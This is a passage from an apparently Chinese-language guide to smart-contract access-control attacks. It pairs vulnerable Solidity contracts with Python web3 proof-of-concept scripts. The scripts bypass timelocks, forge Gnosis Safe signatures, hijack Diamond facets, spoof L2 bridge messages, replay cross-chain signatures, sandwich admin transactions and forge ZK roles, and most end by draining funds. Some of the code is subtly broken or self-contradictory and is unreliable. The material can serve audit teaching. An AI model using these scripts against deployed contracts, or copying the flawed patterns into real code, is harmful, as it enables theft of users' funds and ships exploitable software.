        bytes32 txHash = keccak256(abi.encode(target, value, data));
        // 没有检查 msg.sender 权限！
        delete queued[txHash];
    }
}

// 漏洞3：Timelock + 代理合约的组合漏洞
// Timelock 通过 upgradeTo 升级代理
// 但升级后的新实现可以绕过 timelock 限制
contract UpgradeableTimelockExploit {
    // 攻击路径：
    // 1. 通过 timelock 正常提议升级
    // 2. 等待 delay 后执行升级
    // 3. 新实现包含不受 timelock 保护的恶意函数
    // 4. 直接调用新实现的恶意函数

    address public timelock;
    address public implementation;

    function emergencyWithdraw(address token, uint256 amount) external {
        // 漏洞：这个函数不需要 timelock 调用
        // 升级后可以直接调用
        IERC20(token).transfer(msg.sender, amount);
    }
}
```

**PoC：利用 queuedAt == 0 的 delay 绕过**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 漏洞：queuedAt[txHash] 为 0 时，block.timestamp - 0 > DELAY 永远成立
target = "0xTimelockAddr"

# 构造一个从未 queue 过的 txHash
# 使得 queuedAt[txHash] == 0
data = w3.codec.encode(
    ["address", "uint256", "bytes"],
    [attacker.address, w3.to_wei(100, "ether"), b""]
)
tx_hash = w3.keccak(w3.codec.encode(
    ["address", "uint256", "bytes"],
    [attacker.address, w3.to_wei(100, "ether"), b""]
))

# 直接调用 execute（从未 queue 过）
# queuedAt[txHash] == 0
# block.timestamp - 0 >= 2 days => True (假设当前时间 > 2 days)
tx = timelock.functions.execute(
    target,  # 目标合约
    w3.to_wei(100, "ether"),
    b"",
    tx_hash,
).transact({"from": attacker.address, "gas": 200000})

print(f"[+] Timelock bypass! Never-queued tx executed immediately")
print(f"    tx: {tx.hex()}")
```

### 5. Gnosis Safe 代理攻击

```solidity
// Gnosis Safe 代理攻击：利用 Safe 的 proxy 架构进行权限提升
pragma solidity ^0.8.20;

// ===== Gnosis Safe Proxy 架构 =====
// Gnosis Safe 使用 Proxy 模式：
// Singleton (逻辑合约) ← Proxy ← 用户交互
// 所有 Safe 共享同一个 Singleton 实例

// 漏洞1：Singleton 替换攻击
// Safe 2.0-2.3 使用 storage slot 存储 singleton 地址
// 如果 slot 位置可预测且可写入...
contract SingletonExploit {
    // Safe 的 singleton 存储在特定的 storage slot
    // bytes32(Safe singleton) 在 slot 0 (早期版本) 或特定位置
    // 如果攻击者能在 Safe 中写入任意 slot...

    function exploit() external {
        // 方法1：通过 delegatecall 写入 singleton slot
        // 如果 Safe 的某个函数允许 delegatecall 到任意合约
        // 那么可以在 Safe 上下文中修改 singleton 指针

        // 方法2：利用 Safe 的 execTransactionFromModule
        // Module 可以执行 delegatecall
        // 将 singleton 指向攻击者的合约
    }
}

// 漏洞2：Gnosis Safe 的 owner 操作绕过
// swapOwner 和 addOwner 通过 execTransaction 执行
// 但需要完整多签
// 攻击路径：如果 owner 之间存在信任关系...
contract SafeOwnerExploit {
    // 场景：3/5 Safe，攻击者控制 2 个 owner
    // 正常情况无法执行 swapOwner（需要 3 签名）
    //
    // 但如果 Safe 使用了 Security Council Module
    // 该 Module 可以在紧急情况下绕过多签
    // 攻击者可以先触发"紧急情况"再利用 Module
}

// 漏洞3：Safe 4337 Module 的签名校验
// Safe 的 4337 模块允许通过 UserOp 执行交易
// 但签名校验可能不完整
contract Safe4337Exploit {
    // Safe 4337 使用 checkSignatures 验证 UserOp
    // 但如果 Safe 的 owner 是一个合约（如多签）
    // 且该合约的验证逻辑有缺陷...

    // 攻击：利用 Safe 的 owner 为合约时的 isValidSignature
    // ERC-1271 签名验证可能被绕过
    function forgeSignature(address safe, bytes32 hash) external returns (bool) {
        // 1. 创建一个永远返回 0x1626ba7e 的合约作为 Safe 的 owner
        // 0x1626ba7e = bytes4(keccak256("isValidSignature(bytes32,bytes)"))

        // 2. 将该合约设为 Safe 的 owner（通过 addOwner）

        // 3. 现在任何签名都能通过 Safe 的签名校验
        // Safe 的 checkSignatures 会调用 owner.isValidSignature
        // 而恶意合约总是返回成功

        return true;
    }
}

// ===== Safe 代理初始化抢跑 =====
contract SafeCreate2Exploit {
    // Safe 使用 CREATE2 部署（Deterministic Proxy Factory）
    // 地址可预测 → 可以在部署前抢先调用初始化函数

    function precomputeSafeAddress(
        address factory,
        address[] memory owners,
        uint256 threshold
    ) public pure returns (address) {
        // 计算 CREATE2 地址
        bytes32 salt = keccak256(abi.encode(owners, threshold));
        bytes32 initCodeHash = keccak256(
            type(SingletonProxy).creationCode
        );
        address predicted = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff), factory, salt, initCodeHash
        )))));
        return predicted;
    }
}
```

**PoC：利用 Owner 合约伪造签名**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 部署恶意的 "isValidSignature" 合约
# 该合约对任何签名都返回合法
malicious_owner_code = """
// 恶意 owner 合约
contract MaliciousOwner {
    bytes4 constant MAGIC_VALUE = 0x1626ba7e;

    function isValidSignature(bytes32 hash, bytes calldata)
        external pure returns (bytes4)
    {
        return MAGIC_VALUE; // 永远返回合法
    }
}
"""
malicious_owner = deploy_contract_from_code(malicious_owner_code)
print(f"[+] Malicious owner deployed at {malicious_owner.address}")

# 前提：攻击者已通过某些方式控制 Safe 的 1 个 owner
# 并调用 addOwner 将 malicious_owner 加为 owner

# 现在伪造一笔提取资金的交易
safe = w3.eth.contract(address=safe_addr, abi=safe_abi)

# 1. 伪造签名
fake_hash = w3.keccak(b"malicious transaction data")
fake_sig = b"\x00" * 65  # 任意签名都能通过

# 2. 通过 execTransaction 提取资金
# checkSignatures 会调用 malicious_owner.isValidSignature
# 而它永远返回合法
tx = safe.functions.execTransaction(
    to=attacker.address,
    value=w3.to_wei(100, "ether"),
    data=b"",
    operation=0,  # CALL
    safeTxGas=0,
    baseGas=0,
    gasPrice=0,
    gasToken=w3.to_checksum_address("0x0"),
    refundReceiver=attacker.address,
    signatures=fake_sig,
).transact({
    "from": attacker.address,
    "gas": 200000,
})

print(f"[+] Gnosis Safe funds drained via forged owner signature")
print(f"    tx: {tx.hex()}")
```

### 6. EIP-2535 Diamond Facets 访问控制

```solidity
// EIP-2535 Diamond 标准的 Facet 访问控制漏洞
pragma solidity ^0.8.20;

// ===== Diamond 架构概述 =====
// Diamond: 一个代理合约 → 多个 Facet 合约
// 每个 Facet 提供一组函数
// 使用 DiamondCut 进行 Facet 的添加/替换/移除
// Storage 通过 Diamond Storage 模式分配在不同 slot

// 漏洞1：DiamondCut 函数无访问控制
contract VulnerableDiamond {
    // Facet 映射
    bytes4[] internal facetSelectors;
    mapping(bytes4 => address) internal selectorToFacet;
    // ...

    // 漏洞：diamondCut 没有 properly 保护
    // 任何人都可以添加/替换/删除 Facet！
    function diamondCut(
        FacetCut[] memory _diamondCut,
        address _init,
        bytes memory _calldata
    ) external {
        // 应该有：require(msg.sender == diamondCutFacet)
        // 或者 require(isOwner(msg.sender))

        for (uint256 i = 0; i < _diamondCut.length; i++) {
            FacetCutAction action = _diamondCut[i].action;
            address facet = _diamondCut[i].facetAddress;
            bytes4[] memory selectors = _diamondCut[i].functionSelectors;

            if (action == FacetCutAction.Add) {
                for (uint256 j = 0; j < selectors.length; j++) {
                    selectorToFacet[selectors[j]] = facet;
                }
            } else if (action == FacetCutAction.Replace) {
                for (uint256 j = 0; j < selectors[j].length; j++) {
                    selectorToFacet[selectors[j]] = facet;
                }
            } else if (action == FacetCutAction.Remove) {
                for (uint256 j = 0; j < selectors.length; j++) {
                    delete selectorToFacet[selectors[j]];
                }
            }
        }
    }

    fallback() external payable {
        // 根据 selector 查找 facet 并 delegatecall
        address facet = selectorToFacet[msg.sig];
        require(facet != address(0), "Function does not exist");
        (bool success, ) = facet.delegatecall(msg.data);
        require(success);
    }
}

// 漏洞2：Diamond Storage 冲突
// 不同 Facet 使用相同的 storage slot
contract FacetA {
    // 使用 diamond storage slot 0
    bytes32 constant STORAGE_POSITION = keccak256("diamond.storage.facetA");
    struct Storage {
        uint256 value;
        address owner;
    }

    function getValue() external view returns (uint256) {
        Storage storage ds;
        bytes32 position = STORAGE_POSITION;
        assembly { ds.slot := position }
        return ds.value;
    }
}

contract FacetB {
    // 使用相同的 storage slot（开发者疏忽）
    bytes32 constant STORAGE_POSITION = keccak256("diamond.storage.facetA"); // 错误！
    struct Storage {
        uint256 balance;
        bool isLocked;
    }

    // 读取 FacetA 的 owner 数据，当作自己的 balance
    // 写入自己的数据会覆盖 FacetA 的 owner
    function setBalance(uint256 _balance) external {
        Storage storage ds;
        bytes32 position = STORAGE_POSITION;
        assembly { ds.slot := position }
        ds.balance = _balance; // 覆盖了 FacetA 的 owner！
    }
}

// 攻击合约：替换关键 Facet
contract MaliciousFacet {
    // 替换 DiamondCut Facet，获取完全控制权
    function diamondCut(
        FacetCut[] memory _diamondCut,
        address _init,
        bytes memory _calldata
    ) external {
        // 恶意的 diamondCut：允许任意替换
        // 并且将收益转给攻击者
        // ...
        payable(msg.sender).transfer(address(this).balance);
    }

    // 替换资金管理 Facet
    function withdraw(address token, uint256 amount) external {
        // 直接提取 Diamond 中的资金
        if (token == address(0)) {
            payable(msg.sender).transfer(amount);
        } else {
            IERC20(token).transfer(msg.sender, amount);
        }
    }
}

// ===== Facet 替换的自动化攻击 =====
contract DiamondAttack {
    VulnerableDiamond public diamond;
    address public maliciousFacet;

    constructor(address _diamond) {
        diamond = VulnerableDiamond(_diamond);
    }

    // 自动发现并替换关键 Facet
    function attack() external {
        // 1. 枚举所有已注册的 selector
        // 2. 识别资金管理相关函数（withdraw, transfer 等）
        // 3. 部署包含后门的替换 Facet
        // 4. 调用 diamondCut 替换
        // 5. 通过新 Facet 提取资金

        FacetCut[] memory cuts = new FacetCut[](1);
        cuts[0] = FacetCut({
            action: FacetCutAction.Replace,
            facetAddress: maliciousFacet,
            functionSelectors: getTargetSelectors()
        });

        diamond.diamondCut(cuts, address(0), "");
    }

    function getTargetSelectors() internal view returns (bytes4[] memory) {
        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = bytes4(keccak256("withdraw(address,uint256)"));
        selectors[1] = bytes4(keccak256("transfer(address,uint256)"));
        return selectors;
    }
}
```

**PoC：Diamond Facet 劫持**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 枚举 Diamond 的所有 Facet 和 selector
diamond = w3.eth.contract(address=diamond_addr, abi=diamond_abi)

# 获取所有 facet 地址
facet_list = diamond.functions.facets().call()
for facet_addr, selectors in facet_list:
    print(f"Facet: {facet_addr}")
    for sel in selectors:
        print(f"  -> 0x{sel.hex()}")

# 2. 识别资金管理函数
target_selectors = []
for facet_addr, selectors in facet_list:
    for sel in selectors:
        # 通过 4byte.directory 或已知 ABI 查找函数名
        func_sig = lookup_selector(sel)  # e.g., "withdraw(address,uint256)"
        if any(keyword in func_sig for keyword in ["withdraw", "transfer", "drain"]):
            target_selectors.append(sel)
            print(f"[!] Target selector: {sel.hex()} -> {func_sig}")

# 3. 部署恶意 Facet 并替换
malicious_facet = deploy_contract("MaliciousFacet")
print(f"[+] Malicious facet deployed at {malicious_facet.address}")

# 构造 FacetCut
# FacetCut(address facetAddress, uint8 action, bytes4[] functionSelectors)
cuts = w3.codec.encode(
    ["tuple(address,uint8,bytes4[])[]"],
    [[[
        malicious_facet.address,
        1,  # Replace
        target_selectors,
    ]]]
)

# 4. 调用 diamondCut（无权限检查！）
tx = diamond.functions.diamondCut(
    [(malicious_facet.address, 1, target_selectors)],
    "0x0000000000000000000000000000000000000000",
    b""
).transact({"from": attacker.address, "gas": 300000})

print(f"[+] Diamond facets replaced, tx: {tx.hex()}")

# 5. 通过恶意 Facet 提取资金
malicious = w3.eth.contract(
    address=diamond_addr,
    abi=malicious_facet_abi
)
tx = malicious.functions.withdraw(
    "0x0000000000000000000000000000000000000000",  # ETH
    w3.to_wei(1000, "ether")
).transact({"from": attacker.address, "gas": 100000})

print(f"[+] Diamond funds drained, tx: {tx.hex()}")
```

### 7. Layer 2 访问控制

```solidity
// Layer 2 访问控制漏洞：Sequencer 操控与 L1↔L2 消息伪造
pragma solidity ^0.8.20;

// ===== L1 → L2 消息访问控制 =====
// Optimism/Arbitrum 使用跨链消息传递
// 如果合约没有验证消息来源...

// 漏洞：L1 合约向 L2 发送消息，L2 合约没有验证 msg.sender
contract L2VulnerableBridge {
    address public l1Bridge;

    // 漏洞：任何发送相同格式消息的地址都能触发此函数
    function processL1Message(
        address from,
        address to,
        uint256 amount,
        bytes calldata data
    ) external {
        // 应该验证：require(msg.sender == l1Bridge)
        // 这里缺少验证！

        // 执行 L1 指定的操作
        if (data.length > 0) {
            (bool success, ) = to.call{value: amount}(data);
            require(success);
        }
    }
}

// ===== Optimism Bedrock Predeploys =====
// Optimism 的 predeploy 合约（如 L2CrossDomainMessenger）
// 如果消息验证逻辑有缺陷...
contract OptimismMessageExploit {
    // 攻击路径：
    // 1. 构造一条看起来来自 L1CrossDomainMessenger 的消息
    // 2. 通过 OptimismPortal 或 L2CrossDomainMessenger 注入
    // 3. L2 合约未验证消息真实性

    // Optimism Bedrock 中 L2CrossDomainMessenger 的 xDomainMessageSender
    // 只在 _relayMessage 内部设置
    // 如果 L2 合约不检查 xDomainMessageSender 而是依赖其他方式...
}

// ===== ArbitrumDelayedInbox 攻击 =====
contract InboxExploit {
    // Arbitrum 的 delayed inbox 有一个窗口期
    // 在 batch submit 前可以撤回消息
    // 但如果 L2 合约在此窗口内处理了消息...
}
```

**PoC (Python)：L1→L2 消息伪造**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 目标：L2 上的一个桥接合约，未验证消息来源

# 1. 构造假的跨链消息
fake_message = encode(
    ["address", "address", "uint256", "bytes"],
    [
        attacker.address,          # from (伪造为 L1 合约)
        l2_bridge_addr,            # to
        w3.to_wei(1000, "ether"),  # amount
        b"",                       # data
    ]
)

# 2. 直接调用 L2 合约（绕过桥接）
# 因为合约没有检查 msg.sender == l2CrossDomainMessenger
tx = l2_contract.functions.processL1Message(
    attacker.address,             # 伪造的 from
    attacker.address,             # 提取到攻击者地址
    w3.to_wei(1000, "ether"),
    b"",
).transact({
    "from": attacker.address,
    "gas": 200000,
})

print(f"[+] L1→L2 message spoofed, funds extracted")
print(f"    tx: {tx.hex()}")
```

### 8. 跨链消息访问控制

```solidity
// 跨链桥访问控制漏洞
pragma solidity ^0.8.20;

// ===== 消息验证缺陷 =====
contract VulnerableBridge {
    // 漏洞：只验证了消息的 nonce，没有验证来源链
    mapping(uint256 => bool) public processedNonces;

    function processMessage(
        uint256 sourceChainId,
        address from,
        address to,
        uint256 amount,
        uint256 nonce,
        bytes calldata signature  // 来自源链的签名
    ) external {
        require(!processedNonces[nonce], "Already processed");
        processedNonces[nonce] = true;

        // 漏洞：没有验证 sourceChainId
        // 攻击者可以在目标链上直接调用此函数
        // 伪造一条来自 "源链" 的消息

        // 正确做法：验证 signature 来自已知的源链验证者
        // 或者使用预言机/中继器验证消息真实性

        // 执行跨链转账（铸造/释放资金）
        IERC20(to).transfer(to, amount);
    }
}

// ===== 跨链签名验证缺陷 =====
contract CrossChainSignatureExploit {
    // 很多桥使用 ECDSA 签名验证跨链消息
    // 但有些实现中，签名的 chainId 绑定不完整

    function verifyAndExecute(
        bytes32 messageHash,
        bytes calldata signature,
        uint256 targetChainId
    ) external {
        // 漏洞：messageHash 不包含 chainId
        // 同一签名可以在多条链上重放
        address signer = ecrecover(
            keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)),
            uint8(signature[64]),
            bytes32(signature[0:32]),
            bytes32(signature[32:64])
        );

        // 只检查了 signer 是否合法
        // 没有检查 messageHash 是否包含 targetChainId
        require(signers[signer], "Invalid signer");

        // 在目标链上执行（跨链重放！）
        executeOnTargetChain(messageHash);
    }
}
```

**PoC：跨链消息重放**
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 场景：跨链桥在 Ethereum 和 Arbitrum 之间传递消息
# 消息签名不绑定 chainId

# 1. 在 Ethereum 上捕获一笔合法的跨链消息
# bridge_operator 签名了一条消息：
# "从 Ethereum 转 100 ETH 到 Alice 在 Arbitrum 的地址"

msg_hash = w3.keccak(encode(
    ["address", "address", "uint256", "uint256"],
    [alice.address, alice.address, w3.to_wei(100, "ether"), 1]  # nonce=1
))
operator_sig = sign_hash(msg_hash, operator_key)

# 2. 在 Arbitrum 上重放同一签名
# 修改 target 地址为攻击者
replay_hash = w3.keccak(encode(
    ["address", "address", "uint256", "uint256"],
    [attacker.address, attacker.address, w3.to_wei(100, "ether"), 1]
))
# 由于 chainId 未绑定，相同的签名对不同的 hash 可能也能通过
# 或者攻击者可以构造一个包含相同签名的重放交易

# 更直接的攻击：如果 messageHash 完全相同
# 那么直接在 L2 上调用 processMessage
tx = bridge.functions.processMessage(
    1,              # 伪造 sourceChainId (Ethereum)
    operator.address,  # 伪造的发送者
    attacker.address,  # 攻击者地址
    w3.to_wei(100, "ether"),
    1,              # nonce（如果 L2 也没追踪...）
    operator_sig,   # 合法签名（但来自不同的链上下文）
).transact({"from": attacker.address, "gas": 200000})

print(f"[+] Cross-chain message replayed, tx: {tx.hex()}")
```

### 9. MEV 与访问控制

```solidity
// MEV 与访问控制的交叉：管理员函数被 MEV 机器人抢跑
pragma solidity ^0.8.20;

// ===== 管理员交易被三明治攻击 =====
contract VulnerableAdminTx {
    address public owner;
    address public newOwner;
    bool public transferPending;

    // 漏洞：管理员函数没有防 MEV 保护
    function transferOwnership(address _newOwner) external {
        require(msg.sender == owner, "Not owner");
        newOwner = _newOwner;
        transferPending = true;
    }

    // 如果这个交易被 MEV 机器人检测到...
    // 机器人可以：
    // 1. 在 pending 交易前插入：抢先调用 claimOwnership
    // （如果 claimOwnership 也缺乏检查）
    // 2. 在 pending 交易后插入：撤销操作
    function claimOwnership() external {
        // 漏洞：没有时间锁保护
        require(transferPending, "Not pending");
        owner = newOwner;
        transferPending = false;
    }
}

// ===== MEV 机器人与 Admin 函数的博弈 =====
contract MEVAdminRaceCondition {
    // 场景：DEX 的管理员调用 setFee
    // MEV 机器人检测到 pending 的 setFee 交易
    // 在同一区块内：
    // 1. setFee(1%) → 机器人执行大额 swap（低手续费）
    // 2. setFee(10%) → 机器人反向 swap（高额套利）

    uint256 public fee = 100; // 1%
    mapping(address => bool) public whitelisted;

    function setFee(uint256 _fee) external {
        require(msg.sender == owner, "Not owner");
        // 没有使用 commit-reveal 或时间锁
        // 可以被 MEV 机器人抢跑/三明治
        fee = _fee;
    }

    // 防护：使用 commit-reveal 方案
    // 或者使用 Flashbots 保护管理员交易
    // 或者使用 timelock 给社区时间响应
}
```

**PoC：MEV 机器人抢跑管理员交易**
```python
from web3 import Web3
from web3.middleware import geth_poa_middleware

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 监听 mempool 中的管理员交易
pending_txs = w3.eth.get_block("pending")["transactions"]
for tx_hash in pending_txs:
    tx = w3.eth.get_transaction(tx_hash)
    if tx["to"] == dex_contract_addr:
        # 解码交易数据
        func, params = dex_contract.decode_function_input(tx["input"])
        if func.fn_name == "setFee":
            print(f"[!] Detected admin setFee in pending tx: {tx_hash.hex()}")
            print(f"    New fee: {params}")

            # 2. 构造三明治攻击
            # 前置交易：低手续费时大量买入
            sandwich_buy = dex_contract.functions.swap(
                token_in, token_out,
                w3.to_wei(500, "ether")
            ).build_transaction({
                "from": attacker.address,
                "nonce": w3.eth.get_transaction_count(attacker.address),
                "gasPrice": w3.eth.get_transaction(tx_hash)["gasPrice"] + w3.to_gwei(1),
                "gas": 300000,
            })

            # 后置交易：高手续费时反向卖出
            sandwich_sell = dex_contract.functions.swap(
                token_out, token_in,
                w3.to_wei(500, "ether")  # 实际数量会因手续费变化而获利
            ).build_transaction({
                "from": attacker.address,
                "nonce": w3.eth.get_transaction_count(attacker.address) + 2,
                "gasPrice": w3.eth.get_transaction(tx_hash)["gasPrice"] - 1,
                "gas": 300000,
            })

            # 3. 发送三明治攻击交易
            signed_buy = w3.eth.account.sign_transaction(sandwich_buy, attacker_key)
            signed_sell = w3.eth.account.sign_transaction(sandwich_sell, attacker_key)

            w3.eth.send_raw_transaction(signed_buy.raw_transaction)
            w3.eth.send_raw_transaction(signed_sell.raw_transaction)

            print("[+] Sandwich attack submitted around admin tx")
            break
```

### 10. 零知识证明访问控制

```solidity
// 零知识证明系统中的访问控制漏洞
pragma solidity ^0.8.20;

// ===== ZK 验证器绕过 =====
// 项目方使用 ZK 证明来验证用户身份/权限
// 但验证逻辑存在缺陷

contract ZKAccessControl {
    // Groth16 或 Plonk 验证器
    IVerifier public verifier;

    // 漏洞：验证通过后没有正确设置状态
    mapping(bytes32 => bool) public nullifierHashes; // 防重放

    function verifyAndExecute(
        uint[2] calldata a,        // 证明点 A
        uint[2][2] calldata b,     // 证明点 B
        uint[2] calldata c,        // 证明点 C
        uint[4] calldata publicInputs  // [nullifierHash, root, role, target]
    ) external {
        // 漏洞1：publicInputs[2] (role) 没有在验证时绑定
        // 验证器只检查 nullifierHash 和 root
        // role 是通过 publicInputs 传入的，可以被伪造

        require(!nullifierHashes[publicInputs[0]], "Nullifier already used");
        nullifierHashes[publicInputs[0]] = true;

        // 验证证明
        uint[4] memory input = [
            publicInputs[0],  // nullifierHash
            publicInputs[1],  // Merkle root
            publicInputs[2],  // role — 可以伪造！
            publicInputs[3]   // target
        ];

        require(verifier.verifyProof(a, b, c, input), "Invalid proof");

        // 漏洞2：使用 publicInputs[2] 作为 role
        // 但这个值没有被 ZK 电路约束！
        // 攻击者可以传入任意 role 值

        if (publicInputs[2] == ADMIN_ROLE) {
            // 攻击者传入 ADMIN_ROLE
            // 证明验证通过（因为电路没有约束 role）
            // 获得管理员权限！
            executeAsAdmin(publicInputs[3]);
        }
    }

    function executeAsAdmin(uint256 action) internal {
        // 执行管理员操作
    }
}

// ===== 电路设计缺陷 =====
// 正确的 ZK 电路应该：
// 1. 将 role 作为电路的私有输入
// 2. 在电路中约束 role 的值
// 3. 通过 roleCommitment = Hash(role, userSecret) 绑定
// 4. 将 roleCommitment 作为 public input
//
// 错误设计：
// circuit:
//   private_input: {userSecret, nullifier}
//   public_input: {nullifierHash, merkleRoot}
//   // role 没有出现在电路中！
//   // 调用者可以在 public inputs 中传入任意 role
```

**PoC：ZK 证明 role 伪造**
```python
from web3 import Web3
from py_ecc.bn128 import G1, G2, multiply, add, curve_order, pairing
from hashlib import sha256

w3 = Web3(Web3.HTTPProvider("http://localhost:8545"))

# 1. 获取一个合法的 ZK 证明（用于普通用户角色）
# 通过合法渠道获得 nullifierHash 和 Merkle root
nullifier_hash = int("0x" + "ab" * 32, 16)
merkle_root = int("0x" + "cd" * 32, 16)

# 2. 伪造 publicInputs：将 role 改为 ADMIN_ROLE
ADMIN_ROLE = 1
admin_role_bytes = ADMIN_ROLE.to_bytes(32, 'big')

# 构造 publicInputs
# [nullifierHash, merkleRoot, ADMIN_ROLE, targetAction]
public_inputs = [
    nullifier_hash,
    merkle_root,
    ADMIN_ROLE,       # ← 伪造！原始证明中 role = USER (0)
    0,                 # target action: withdraw
]

# 3. 用相同的证明 (a, b, c) 但不同的 public inputs 提交
# 如果电路没有约束 role，这个证明仍然有效！
tx = zk_contract.functions.verifyAndExecute(
    proof_a,  # 来自合法证明
    proof_b,
    proof_c,
    public_inputs,  # role 被篡改为 ADMIN
).transact({
    "from": attacker.address,
    "gas": 500000,
})

print(f"[+] ZK role forgery complete, gained ADMIN access")
print(f"    tx: {tx.hex()}")
```

## 工具推荐

- **Slither** — 静态分析
- **Mythril** — 符号执行
- **Echidna** — 模糊测试
- **OpenZeppelin** — 安全库

## 参考链接

- [SWC-105: Unprotected Ether Withdrawal](https://swcregistry.io/docs/SWC-105)
- [SWC-106: Unprotected SELFDESTRUCT](https://swcregistry.io/docs/SWC-106)
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- [Parity Wallet Hack](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/)
